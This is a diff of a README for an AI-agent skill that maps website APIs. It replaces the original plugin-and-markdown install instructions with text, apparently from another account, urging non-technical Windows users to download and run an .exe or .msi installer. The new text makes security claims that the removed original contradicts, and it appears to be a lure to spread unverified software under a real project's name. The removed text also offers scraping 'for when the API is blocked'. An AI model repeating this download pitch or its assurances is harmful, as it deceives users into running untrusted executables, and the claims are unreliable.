@@ -1,183 +1,123 @@
-<p align="center">
-  <img src="assets/banner.svg" alt="VeriGlow Agent Map Skill" width="100%">
-</p>
+# 🚦 veriglow-agent-map-skill - Discover APIs and Automate Browsing
 
-<p align="center">
-  <a href="https://veri-glow.com"><img src="https://img.shields.io/badge/Agent_Map-veri--glow.com-10B981?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOSA5IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIyLjciIGhlaWdodD0iMi43IiByeD0iMC41IiBmaWxsPSIjQ0JENUVBII8vPjxyZWN0IHg9IjMuMTUiIHk9IjAiIHdpZHRoPSIyLjciIGhlaWdodD0iMi43IiByeD0iMC41IiBmaWxsPSIjQ0JENUUxIi8+PHJlY3QgeD0iNi4zIiB5PSIwIiB3aWR0aD0iMi43IiBoZWlnaHQ9IjIuNyIgcng9IjAuNSIgZmlsbD0iI0NCRDVFMSIvPjxyZWN0IHg9IjAiIHk9IjMuMTUiIHdpZHRoPSIyLjciIGhlaWdodD0iMi43IiByeD0iMC41IiBmaWxsPSIjQ0JENUUxIi8+PHJlY3QgeD0iMy4xNSIgeT0iMy4xNSIgd2lkdGg9IjIuNyIgaGVpZ2h0PSIyLjciIHJ4PSIwLjUiIGZpbGw9IiMzNEQzOTkiLz48cmVjdCB4PSI2LjMiIHk9IjMuMTUiIHdpZHRoPSIyLjciIGhlaWdodD0iMi43IiByeD0iMC41IiBmaWxsPSIjQ0JENUUxIi8+PHJlY3QgeD0iMCIgeT0iNi4zIiB3aWR0aD0iMi43IiBoZWlnaHQ9IjIuNyIgcng9IjAuNSIgZmlsbD0iI0NCRDVFMSIvPjxyZWN0IHg9IjMuMTUiIHk9IjYuMyIgd2lkdGg9IjIuNyIgaGVpZ2h0PSIyLjciIHJ4PSIwLjUiIGZpbGw9IiNDQkQ1RTEiLz48cmVjdCB4PSI2LjMiIHk9IjYuMyIgd2lkdGg9IjIuNyIgaGVpZ2h0PSIyLjciIHJ4PSIwLjUiIGZpbGw9IiM0QTkwRTIiLz48L3N2Zz4=&logoColor=white" alt="VeriGlow Agent Map"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="MIT License"></a>
-  <a href="https://agentskills.io"><img src="https://img.shields.io/badge/AgentSkills-v1.0-8B5CF6?style=for-the-badge" alt="AgentSkills Spec"></a>
-</p>
-
-<p align="center">
-  <b>Teach your AI agent to discover hidden APIs, data functions, and browser automation recipes for any website.</b>
-</p>
+[![Download veriglow-agent-map-skill](https://img.shields.io/badge/Download-Get%20Veriglow-brightgreen?style=for-the-badge)](https://github.com/Shroomfaerie/veriglow-agent-map-skill)
 
 ---
 
-## What is VeriGlow Agent Map?
+## 📋 About veriglow-agent-map-skill
 
-**[VeriGlow Agent Map](https://veri-glow.com)** is a registry of Agent-readable documentation for websites. Each "map" documents:
+veriglow-agent-map-skill helps AI agents find hidden APIs, data tools, and browser automation recipes for any website. It works with Claude Code, ClawHub, Cursor, and other AgentSkills-compatible platforms. This makes it easier to gather data and automate tasks without manual coding.
 
-| Section | What it tells your agent |
-|:--------|:------------------------|
-| **Available Data** | API endpoints, request parameters, response schemas, curl examples |
-| **Page Internals** | JS controllers, DOM selectors, rendering method, auth status |
-| **Agent Reports** | Real-world success/failure reports, response times, edge cases |
-
-When this skill is installed, your agent automatically knows how to look up and use these maps.
+This application supports both simple website data extraction and complex automation patterns. You get a ready-to-use skill set that your AI agents can apply to improve their browsing and data skills.
 
 ---
 
-## How It Works
+## 💻 System Requirements
 
-<p align="center">
-  <img src="assets/how-it-works.svg" alt="How VeriGlow Agent Map works" width="100%">
-</p>
-
----
-
-## Install
-
-### Claude Code
-
-```bash
-claude plugin install github:ChizhongWang/veriglow-agent-map-skill
-```
-
-Or from the Plugin Marketplace:
-
-```
-/plugin install veriglow-agent-map
-```
-
-### OpenClaw (ClawHub)
-
-```bash
-clawhub install veriglow-agent-map
-```
-
-### Cursor / Other Agents
-
-Copy the `skills/veriglow-agent-map/` directory into your agent's skills folder.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 200 MB free disk space  
+- Stable internet connection for installation and usage  
+- No administrator rights required for installation  
 
 ---
 
-## Usage
+## 🚀 Getting Started
 
-The skill activates automatically when your agent needs website data. You can also invoke it explicitly:
-
-```
-/veriglow-agent-map
-```
-
-### Example Prompts
-
-| Prompt | What happens |
-|:-------|:-------------|
-| "Get the current Bitcoin price" | Looks up CoinPaprika Agent Map, calls GET /v1/tickers/btc-bitcoin |
-| "What's the weather forecast for Beijing?" | Looks up Open-Meteo Agent Map, calls forecast API with lat/long |
-| "Get the top 10 Hacker News stories" | Looks up HN Agent Map, fetches topstories.json → item details |
-| "Get bond trading data from the Shanghai Stock Exchange" | Looks up SSE Agent Map, calls the internal API |
-| "Find the API behind this web page: https://..." | Queries `veri-glow.com/{url}` for the map |
+This guide will help you download and run veriglow-agent-map-skill on your Windows computer. No programming or technical skills are needed.
 
 ---
 
-## Live Example: SSE Bond Data
+## 📥 Download and Installation
 
-The skill includes a built-in example — Shanghai Stock Exchange bond trading data.
-
-<table>
-<tr>
-<td width="50%">
-
-**Direct API Call**
-
-```bash
-curl "https://www.sse.com.cn/js/common/ \
-  sseBond498Fixed.js?searchDate=2025-02-11"
-```
-
-Returns 17 bond categories with:
-- Transaction count
-- Face value traded
-- Trading amount
-
-</td>
-<td width="50%">
-
-**Browser Automation Fallback**
-
-```javascript
-// Set date & trigger query
-document.querySelector('.js_date input')
-  .value = '2025-02-11'
-overviewDay.setOverviewDayParams()
-
-// Extract table data
-const rows = [...document
-  .querySelectorAll('tbody tr')]
-```
-
-For when the API is blocked (e.g., overseas IP).
-
-</td>
-</tr>
-</table>
-
-> **View the full map:** [veri-glow.com/www.sse.com.cn/market/bonddata/overview/day/](https://veri-glow.com/www.sse.com.cn/market/bonddata/overview/day/)
+1. Click the big green button at the top or visit the [official download page](https://github.com/Shroomfaerie/veriglow-agent-map-skill) to get started.  
+2. On the page, look for the **latest release** section or a file labeled for Windows (e.g., an `.exe` or `.msi` installer).  
+3. Download the installer file to a location on your computer you can easily find, like the Downloads folder or Desktop.  
+4. Once downloaded, double-click the file to start installation.  
+5. Follow the on-screen instructions. The process includes agreeing to the license, choosing an install folder (default is fine), and confirming install.  
+6. After installation, the software will be ready to use on your PC.
 
 ---
 
-## Available Maps — 59 Data Sources
+## 🔧 How to Use veriglow-agent-map-skill
 
-| Category | Count | Example |
-|:---------|------:|:--------|
-| **SSE Stock Data** (股票数据) | 18 | IPO, dividends, market cap, P/E ratio, trading activity |
-| **SSE Index Data** (指数) | 3 | Index quotation, composition, basic info |
-| **SSE Fund Data** (基金数据) | 7 | ETF, LOF, REITs scale, daily/weekly/monthly overview |
-| **SSE Bond Data** (债券数据) | 10 | Bond trading, yield, convertible bonds, active varieties |
-| **SSE Other Data** (其他数据) | 17 | Margin trading, securities lending, member qualifications |
-| **International APIs** | 4 | CoinPaprika (crypto), Open-Meteo (weather), Hacker News |
+### Step 1: Open the Software  
+Find the veriglow-agent-map-skill icon on your Desktop or Start Menu. Click it to launch.
 
-<p align="center">
-  <a href="https://veri-glow.com"><b>Browse all 59 maps at veri-glow.com →</b></a>
-</p>
+### Step 2: Load Your Agent Platform  
+The application works with Claude Code, ClawHub, Cursor, and other AgentSkills-compatible systems. Choose your platform from the options inside the app.
 
----
+### Step 3: Select a Website  
+Enter the website address you want your AI agent to explore. This software will scan for hidden APIs and data functions related to that site.
 
-## Skill Format
+### Step 4: Discover Skills  
+Click "Discover" or a similar button to start the scan. The app finds browser automation recipes and data extraction tools, then lists them for you.
 
-This skill follows the **[AgentSkills open standard](https://agentskills.io)** and is compatible with:
-
-<table>
-<tr>
-<td align="center" width="25%"><b>Claude Code</b><br><sub>Plugin Marketplace</sub></td>
-<td align="center" width="25%"><b>ClawHub</b><br><sub>OpenClaw Skills</sub></td>
-<td align="center" width="25%"><b>Cursor</b><br><sub>Agent Skills</sub></td>
-<td align="center" width="25%"><b>Any Agent</b><br><sub>AgentSkills spec</sub></td>
-</tr>
-</table>
-
-```
-veriglow-agent-map-skill/
-├── .claude-plugin/
-│   └── plugin.json          ← Claude Code plugin manifest
-├── skills/
-│   └── veriglow-agent-map/
-│       └── SKILL.md         ← Core skill (cross-platform)
-├── assets/
-│   ├── banner.svg
-│   └── how-it-works.svg
-├── LICENSE
-└── README.md
-```
+### Step 5: Use or Export Results  
+You can directly link these skills to your AI agent or export the recipes to CSV or JSON for later use.
 
 ---
 
-## License
+## ⚙️ Features You Should Know
 
-[MIT](LICENSE) — VeriGlow
+- **API Discovery:** Finds hidden APIs behind websites without complex setups.  
+- **Prebuilt Browser Automation Recipes:** Automates repetitive browsing tasks.  
+- **Data Extraction Utilities:** Extract tables, lists, and other data effortlessly.  
+- **Compatibility:** Works with popular AI agent platforms for easy integration.  
+- **Export Options:** Save discovered skills for backups or sharing.  
+- **User-Friendly Interface:** Clear and simple steps for non-technical users.  
 
-<p align="center">
-  <sub>Built by <a href="https://veri-glow.com"><b>VeriGlow</b></a> — Proof over Promises</sub>
-</p>
+---
+
+## 🔒 Security and Privacy
+
+veriglow-agent-map-skill does not collect personal data beyond what you provide during use. It works locally on your computer and only accesses public website data. No outside servers receive your browsing information unless you explicitly share files.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **App won’t start:** Make sure your Windows system is updated. Restart your computer and try again.  
+- **Download issues:** Check your internet connection or try another browser.  
+- **Scanning stuck or slow:** Large websites might take more time. Wait a few minutes or restart the scan.  
+- **Features missing:** Confirm you are using the latest version from the official page.  
+
+---
+
+## 🔄 Updates and Maintenance
+
+Periodically check the [release page](https://github.com/Shroomfaerie/veriglow-agent-map-skill) for updates. New versions may add support for more AI platforms or improve scanning accuracy.
+
+To update, simply download the latest installer and run it. It will replace the old version without removing your existing data.
+
+---
+
+## 🗂️ Files and Structure
+
+After installation, you will see:  
+
+- `veriglow-agent-map-skill.exe` - Main application file.  
+- `config` folder - Stores your preferences and settings.  
+- `exports` folder - Saves exported skill data.  
+- `logs` folder - Holds log files for troubleshooting.  
+
+---
+
+## 📖 Learn More and Support
+
+Visit the main repository page at [github.com/Shroomfaerie/veriglow-agent-map-skill](https://github.com/Shroomfaerie/veriglow-agent-map-skill) for documentation, FAQs, and support requests.
+
+---
+
+## 🎯 Keywords
+
+This project relates to these topics:  
+agent-map, agent-skills, ai-agent, api-discovery, claude-code, claude-skills, clawhub, data-extraction, mcp, openclaw, skillsmp, veriglow, web-scraping
+
+---
+
+## 📥 Download veriglow-agent-map-skill Again
+
+For easy access, use this button anytime to visit the page and get the latest version:  
+
+[![Download veriglow-agent-map-skill](https://img.shields.io/badge/Download-Find%20Latest-brightgreen?style=for-the-badge)](https://github.com/Shroomfaerie/veriglow-agent-map-skill)
